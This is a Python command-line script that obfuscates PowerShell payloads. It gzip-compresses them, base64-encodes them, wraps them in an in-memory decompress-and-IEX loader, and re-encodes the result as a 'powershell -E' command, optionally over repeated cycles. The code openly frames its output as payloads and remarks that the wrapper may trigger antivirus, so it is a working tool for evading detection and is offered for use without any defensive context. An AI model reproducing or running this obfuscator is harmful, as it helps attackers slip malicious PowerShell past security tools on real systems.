import base64
import gzip
import argparse
import os

# TODO current powershell evokation is simple (e.g. only -E flag) future will allow more flags to be set (e.g. no window, no logging, etc)

#=================================================================================================================================================
# Encoding
#=================================================================================================================================================

def b64_encode_powershell_script(powershell_commands: str):
	"""
	Encodes a string (script) into base 64. 
	In order to be suitable for powershell's EncodedCommand utility string must be converted into UTF-16LE first
	"""
	# Convert to UTF-16LE for powershell
	utf16_payload = powershell_commands.encode('utf-16le')

	# Base 64 Encode w'wrapped' payload (and get string from bytes)
	payload_base64_encoded = base64.b64encode(utf16_payload).decode()

	return payload_base64_encoded

def get_powershell_encoded_command_string_for_script(powershell_commands: str):
	"""
	Encodes a powershell script and then places into powershells EncodedCommand utility, resulting string is directly executable
	in command line/powershell
	"""
	# Get the encoded command
	payload_base64_encoded = b64_encode_powershell_script(powershell_commands)

	# Return basic cmd/powershell command
	return f'powershell -E {payload_base64_encoded}'

def repeat_power_shell_encoded_command(powershell_commands:str, number_of_repeats: int):
	"""
	The process of command -> Encoding -> Execute Encoded Command results in a new powershell command
	Hence this process can be looped an arbitray number of times
	"""
	# initialise
	previous_powershell_commands = powershell_commands
	
	# loop
	for i in range(number_of_repeats):
		# Carry encoding cycle
		# TODO, if only adding 'powershell -E' to script perhaps only this element needs converted to utf16le?
		# this would save constantly doubling the size each iteration but may not decode properly
		cuurent_powershell_commands = get_powershell_encoded_command_string_for_script(powershell_commands=previous_powershell_commands)
		# prime next encoding cycle
		previous_powershell_commands = cuurent_powershell_commands

	# Return final commands
	return cuurent_powershell_commands

#=================================================================================================================================================
# COMPRESSING
#=================================================================================================================================================

def gzip_compress_powershell_string(powershell: str):
	"""Note returns the BYTES"""
	return gzip.compress(powershell.encode())

def gzip_and_encode_powershell_string(powershell: str):
	# Compress to get bytes
	gzip_bytes = gzip_compress_powershell_string(powershell)
	# Encode and return encoded result
	return base64.b64encode(gzip_bytes).decode()

def wrap_compressed_encoded_powershell(encoded_powershell: str):
	"""This string may trigger Anti Virus"""
	return f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"{encoded_powershell}\"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'

def encode_wrapped_powershell(wrapped_powershell: str):
	return get_powershell_encoded_command_string_for_script(wrapped_powershell)

#=================================================================================================================================================
# END TO END
#=================================================================================================================================================

def compress_encode_wrap_encode_powershell(powershell:str):
	"""End to end for powershell obfuscation"""
	gzip_and_encoded = gzip_and_encode_powershell_string(powershell)
	wrapped = wrap_compressed_encoded_powershell(gzip_and_encoded)
	wrapped_encoded_command = encode_wrapped_powershell(wrapped)

	return wrapped_encoded_command

def repeated_compress_encode_wrap_encode(powershell: str, number_of_repeats: int):
	"""
	The process of command -> compress -> Encoding -> wrap -> encode, results in a new powershell command
	Hence this process can be looped an arbitray number of times
	due to compression file expansion is not as severe as in 'repeat_power_shell_encoded_command'
	"""
	# initialise
	previous_powershell_commands = powershell
	
	# loop
	for i in range(number_of_repeats):
		# Carry encoding cycle
		cuurent_powershell_commands = compress_encode_wrap_encode_powershell(previous_powershell_commands)
		# prime next encoding cycle
		previous_powershell_commands = cuurent_powershell_commands

	# Return final commands
	return cuurent_powershell_commands

#=================================================================================================================================================
# MAIN
#=================================================================================================================================================

if __name__ == '__main__':
	# Add Parser For Command Line Tool
	parser = argparse.ArgumentParser(description='Handle and automate powershell compression/encoding/wrapping/encoding')

	# Add Arguments to Parser
	parser.add_argument("-f", "--file", type = str, help = "Powershell script for comperssion/encoding", required = True)
	parser.add_argument("-o", "--output_file", type = str, help = "Output path for compressed/encoded payload")
	parser.add_argument("-n", "--number_cycles", type=int, help = "Number of rounds of compression/encoding/wrapping/encoding cycles to be applied", default=1)

	# Unpack Arguments
	args = parser.parse_args()

	# Check output file not already present (unintentional overwrite)
	if args.output_file is not None and os.path.exists(args.output_file):
		raise Exception(f"Output file at: {args.output_file} already exists!!")

	# Check powerhsell file exists
	if not os.path.exists(args.file):
		raise Exception(f"File at: {args.file} doesn't exist!")

	# Read payload bytes
	with open(args.file, "rb") as f:
		payload_bytes = f.read()

	# Get encoded payload
	encoded_payload = repeated_compress_encode_wrap_encode(payload_bytes.decode(), args.number_cycles)

	# Print
	print(f"- - - Encoded Powershell - - - ")
	print("")
	print(encoded_payload)
	print("")
	print(" - - - - - - - - - - - - - - - -")

	if args.output_file is not None:
		print(f"Saving above powershell to: {args.output_file}")
		with open(args.output_file, "w") as out:
			out.write(encoded_payload)
		print("Saved Successfully")

